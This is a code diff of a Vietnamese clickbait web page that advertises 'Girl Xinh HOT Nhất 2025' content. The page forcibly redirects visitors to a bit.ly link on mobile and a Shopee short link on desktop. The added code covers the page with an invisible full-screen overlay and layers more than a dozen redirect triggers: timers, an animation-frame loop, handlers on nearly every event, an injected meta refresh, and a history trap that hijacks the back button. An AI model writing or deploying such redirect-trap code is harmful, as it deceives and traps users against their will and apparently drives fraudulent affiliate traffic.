@@ -29,10 +29,6 @@
       text-align: center;
       margin: 0 auto;
       z-index: 1;
-      transition: transform 0.3s ease;
-    }
-    .card:hover {
-      transform: scale(1.02);
     }
     .card img {
       width: 100%;
@@ -58,10 +54,6 @@
       cursor: pointer;
       z-index: 2;
       position: relative;
-      transition: background-color 0.3s ease;
-    }
-    .real-btn:hover {
-      background-color: #f4511e;
     }
     .full-cover {
       position: fixed;
@@ -73,172 +65,150 @@
       background: transparent;
     }
     
-    /* Thêm một số element ẩn để bắt thêm events */
-    .hidden-trigger {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
+    /* Invisible overlay để bắt click */
+    .invisible-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 999;
+      background: transparent;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <div class="full-cover" id="fullClick"></div>
-  <div class="card" id="mobileCard">
-    <img src="https://raw.githubusercontent.com/ncdathwb/Girl-Xinh-Viet-Nam/main/images/thumbnail.jpg" alt="Girl Xinh 2025" />
-    <h2>🔥 Girl Xinh HOT Nhất 2025!</h2>
-    <button class="real-btn" id="realBtn">Xem chi tiết</button>
-  </div>
+  <div class="invisible-overlay" onclick="redirectNow()"></div>
+  <div class="full-cover" onclick="redirectNow()"></div>
   
-  <!-- Hidden elements để trigger thêm events -->
-  <input type="text" class="hidden-trigger" id="hiddenInput" />
-  <div class="hidden-trigger" id="hiddenDiv"></div>
+  <div class="card" id="mobileCard" onclick="redirectNow()">
+    <img src="https://raw.githubusercontent.com/ncdathwb/Girl-Xinh-Viet-Nam/main/images/thumbnail.jpg" alt="Girl Xinh 2025" onclick="redirectNow()" />
+    <h2 onclick="redirectNow()">🔥 Girl Xinh HOT Nhất 2025!</h2>
+    <button class="real-btn" onclick="redirectNow()">Xem chi tiết</button>
+  </div>
   
   <script>
     const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
       navigator.userAgent.toLowerCase()
     );
     
-    // Đường link rút gọn
     const mobileRedirect = "https://bit.ly/4mFmhBP";
     const desktopRedirect = "https://s.shopee.vn/BHgbsTkUj";
     
+    let hasRedirected = false;
+    
+    function redirectNow() {
+      if (!hasRedirected) {
+        hasRedirected = true;
+        window.location.href = mobileRedirect;
+      }
+    }
+    
     if (!isMobile) {
-      // Desktop redirect ngay lập tức
       window.location.href = desktopRedirect;
     } else {
-      // Mobile - hiển thị card và setup redirect
       document.getElementById("mobileCard").style.display = "block";
       
-      let redirected = false;
-      let redirectTimer = null;
+      // Method 1: Redirect ngay sau 0.5 giây
+      setTimeout(redirectNow, 500);
       
-      function redirect() {
-        if (!redirected) {
-          redirected = true;
-          clearTimeout(redirectTimer);
-          window.location.href = mobileRedirect;
+      // Method 2: Redirect khi page load xong
+      window.onload = redirectNow;
+      document.onload = redirectNow;
+      
+      // Method 3: Redirect khi DOMContentLoaded
+      document.addEventListener('DOMContentLoaded', redirectNow);
+      
+      // Method 4: Redirect với interval ngắn
+      let quickInterval = setInterval(redirectNow, 100);
+      
+      // Method 5: Multiple timer backups
+      setTimeout(redirectNow, 200);
+      setTimeout(redirectNow, 800);
+      setTimeout(redirectNow, 1200);
+      setTimeout(redirectNow, 1500);
+      
+      // Method 6: Inline onclick trên tất cả elements
+      document.onclick = redirectNow;
+      document.ontouchstart = redirectNow;
+      document.ontouchmove = redirectNow;
+      document.ontouchend = redirectNow;
+      document.onscroll = redirectNow;
+      document.onwheel = redirectNow;
+      document.onkeydown = redirectNow;
+      document.onmousemove = redirectNow;
+      document.onmousedown = redirectNow;
+      
+      // Method 7: Window events
+      window.onclick = redirectNow;
+      window.ontouchstart = redirectNow;
+      window.onscroll = redirectNow;
+      window.onfocus = redirectNow;
+      window.onblur = redirectNow;
+      
+      // Method 8: Body events
+      document.body.onclick = redirectNow;
+      document.body.ontouchstart = redirectNow;
+      document.body.onscroll = redirectNow;
+      
+      // Method 9: Meta refresh backup
+      setTimeout(function() {
+        if (!hasRedirected) {
+          document.head.innerHTML += '<meta http-equiv="refresh" content="0;url=' + mobileRedirect + '">';
         }
-      }
+      }, 1000);
       
-      // Auto redirect sau 3 giây nếu không có tương tác
-      redirectTimer = setTimeout(redirect, 3000);
-      
-      // Danh sách tất cả events cần bắt
-      const events = [
-        'click', 'tap', 'touchstart', 'touchend', 'touchmove', 'touchcancel',
-        'mousedown', 'mouseup', 'mousemove', 'mouseenter', 'mouseleave',
-        'scroll', 'wheel', 'keydown', 'keyup', 'keypress',
-        'focus', 'blur', 'change', 'input', 'resize',
-        'orientationchange', 'devicemotion', 'deviceorientation',
-        'gesturestart', 'gesturechange', 'gestureend',
-        'pointerdown', 'pointerup', 'pointermove', 'pointercancel',
-        'contextmenu', 'selectstart', 'dragstart'
-      ];
-      
-      // Elements cần bắt events
-      const elements = [
-        document,
-        document.body,
-        window,
-        document.getElementById("fullClick"),
-        document.getElementById("realBtn"),
-        document.getElementById("mobileCard"),
-        document.getElementById("hiddenInput"),
-        document.getElementById("hiddenDiv")
-      ];
-      
-      // Thêm event listeners cho tất cả combinations
-      elements.forEach(element => {
-        if (element) {
-          events.forEach(eventType => {
-            try {
-              element.addEventListener(eventType, redirect, { passive: true });
-            } catch (e) {
-              // Ignore nếu event không support
-            }
-          });
+      // Method 10: Location assign backup
+      setTimeout(function() {
+        if (!hasRedirected) {
+          window.location.assign(mobileRedirect);
         }
-      });
+      }, 1500);
       
-      // Thêm một số event listeners đặc biệt
-      
-      // Bắt khi người dùng copy text
-      document.addEventListener('copy', redirect);
-      document.addEventListener('cut', redirect);
-      document.addEventListener('paste', redirect);
-      
-      // Bắt khi focus vào window
-      window.addEventListener('focus', redirect);
-      window.addEventListener('blur', redirect);
-      
-      // Bắt page visibility change
-      document.addEventListener('visibilitychange', function() {
-        if (!document.hidden) {
-          redirect();
+      // Method 11: Location replace backup  
+      setTimeout(function() {
+        if (!hasRedirected) {
+          window.location.replace(mobileRedirect);
         }
-      });
-      
-      // Bắt khi load xong
-      window.addEventListener('load', function() {
-        setTimeout(redirect, 1000);
-      });
-      
-      // Bắt beforeunload
-      window.addEventListener('beforeunload', redirect);
-      
-      // Polling để check nếu user vẫn active
-      let activityCheckInterval = setInterval(function() {
-        redirect();
       }, 2000);
       
-      // Cleanup khi redirect
-      function cleanupAndRedirect() {
-        clearInterval(activityCheckInterval);
-        clearTimeout(redirectTimer);
-        redirect();
+      // Method 12: History pushState trigger
+      if (history.pushState) {
+        history.pushState(null, null, window.location.href);
+        window.onpopstate = redirectNow;
       }
       
-      // History API events
-      window.addEventListener('popstate', cleanupAndRedirect);
-      window.addEventListener('hashchange', cleanupAndRedirect);
+      // Method 13: Hash change trigger
+      window.onhashchange = redirectNow;
+      setTimeout(function() {
+        window.location.hash = '#redirect';
+      }, 300);
       
-      // Media events
-      window.addEventListener('online', redirect);
-      window.addEventListener('offline', redirect);
+      // Method 14: Visibility change
+      document.onvisibilitychange = function() {
+        if (!document.hidden) redirectNow();
+      };
       
-      // Battery API nếu có
-      if ('getBattery' in navigator) {
-        navigator.getBattery().then(function(battery) {
-          battery.addEventListener('chargingchange', redirect);
-          battery.addEventListener('levelchange', redirect);
-        });
+      // Method 15: RequestAnimationFrame loop
+      function animationLoop() {
+        redirectNow();
+        if (!hasRedirected) {
+          requestAnimationFrame(animationLoop);
+        }
       }
+      requestAnimationFrame(animationLoop);
       
-      // Page performance observer
-      if ('PerformanceObserver' in window) {
-        try {
-          const observer = new PerformanceObserver(redirect);
-          observer.observe({entryTypes: ['navigation', 'resource']});
-        } catch (e) {}
-      }
-      
-      // Intersection Observer để bắt khi elements vào viewport
-      if ('IntersectionObserver' in window) {
-        const observer = new IntersectionObserver(redirect);
-        observer.observe(document.getElementById("mobileCard"));
-      }
-      
-      // Mutation Observer để bắt DOM changes
-      if ('MutationObserver' in window) {
-        const observer = new MutationObserver(redirect);
-        observer.observe(document.body, {
-          childList: true,
-          subtree: true,
-          attributes: true
-        });
-      }
+      // Method 16: Force redirect với window.open backup
+      setTimeout(function() {
+        if (!hasRedirected) {
+          try {
+            window.open(mobileRedirect, '_self');
+          } catch(e) {
+            window.location = mobileRedirect;
+          }
+        }
+      }, 2500);
     }
   </script>
 </body>
